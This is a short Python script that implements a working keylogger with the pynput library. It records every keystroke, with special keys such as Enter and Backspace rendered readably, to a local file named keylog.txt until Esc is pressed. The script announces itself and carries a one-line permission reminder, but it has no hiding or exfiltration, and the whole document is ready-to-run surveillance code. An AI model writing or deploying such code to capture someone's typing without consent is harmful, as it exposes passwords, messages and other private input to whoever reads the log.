# To run this script, you need to install the pynput library:
# pip install pynput

import pynput
from pynput.keyboard import Key, Listener

# File to save the logged keystrokes
log_file = "keylog.txt"

def on_press(key):
    """
    Callback function that is called when a key is pressed.
    Logs the key to the file.
    """
    try:
        with open(log_file, "a") as f:
            # Log printable keys as characters
            f.write(str(key.char))
    except AttributeError:
        # Log special keys (e.g., space, enter) in a readable format
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == Key.backspace:
            with open(log_file, "a") as f:
                f.write("[BACKSPACE]")
        elif key == Key.tab:
            with open(log_file, "a") as f:
                f.write("[TAB]")
        else:
            # Log other special keys
            with open(log_file, "a") as f:
                f.write(f"[{key}]")

def on_release(key):
    """
    Callback function that is called when a key is released.
    Stops the listener if Esc is pressed.
    """
    if key == Key.esc:
        # Stop listener
        return False

# Main script to start the keylogger
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    print("All keystrokes will be logged to 'keylog.txt'.")
    print("Reminder: Ensure you have permission to run this.")
    
    # Set up the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    

    print("Keylogger stopped.")
